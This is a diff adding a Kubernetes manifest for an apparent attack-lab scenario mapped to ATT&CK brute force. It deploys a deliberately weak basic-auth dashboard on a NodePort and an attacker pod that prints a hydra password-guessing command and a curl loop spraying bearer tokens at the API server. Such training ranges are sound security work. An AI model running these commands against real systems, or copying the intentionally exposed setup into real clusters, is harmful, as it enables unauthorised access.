@@ -1,0 +1,98 @@
+# KOAD-S24: Brute Force
+# ATT&CK: T1110 — Brute Force
+# Attack: Password spray against Dashboard / API Server
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: kube-dashboard-insecure
+  namespace: koad
+  labels:
+    app: kube-dashboard
+    koad-scenario: S24
+    mitre-attck: T1110
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: kube-dashboard
+  template:
+    metadata:
+      labels:
+        app: kube-dashboard
+        koad-scenario: S24
+    spec:
+      containers:
+        - name: dashboard
+          image: nginx:1.27-alpine
+          ports:
+            - containerPort: 443
+          volumeMounts:
+            - name: auth-config
+              mountPath: /etc/nginx/conf.d
+      volumes:
+        - name: auth-config
+          configMap:
+            name: dashboard-auth
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: dashboard-auth
+  namespace: koad
+  labels:
+    koad-scenario: S24
+data:
+  default.conf: |
+    server {
+        listen 443;
+        location / {
+            auth_basic "Kubernetes Dashboard";
+            auth_basic_user_file /etc/nginx/.htpasswd;
+            root /usr/share/nginx/html;
+        }
+    }
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: kube-dashboard
+  namespace: koad
+  labels:
+    koad-scenario: S24
+spec:
+  type: NodePort
+  selector:
+    app: kube-dashboard
+  ports:
+    - port: 443
+      targetPort: 443
+      nodePort: 30443
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: brute-forcer
+  namespace: koad
+  labels:
+    koad-scenario: S24
+spec:
+  containers:
+    - name: hydra
+      image: koad/brute-forcer:latest
+      imagePullPolicy: IfNotPresent
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S24: Brute Force ==="
+          echo ""
+          echo "Target: kube-dashboard.koad:443"
+          echo ""
+          echo "Attack with hydra:"
+          echo "  hydra -l admin -P /wordlists/common.txt kube-dashboard.koad http-get / -s 443"
+          echo ""
+          echo "Attack API Server token spray:"
+          echo "  for token in \$(cat /wordlists/tokens.txt); do"
+          echo "    curl -sk -H \"Authorization: Bearer \$token\" https://kubernetes.default/api/v1/namespaces"
+          echo "  done"
+          sleep infinity
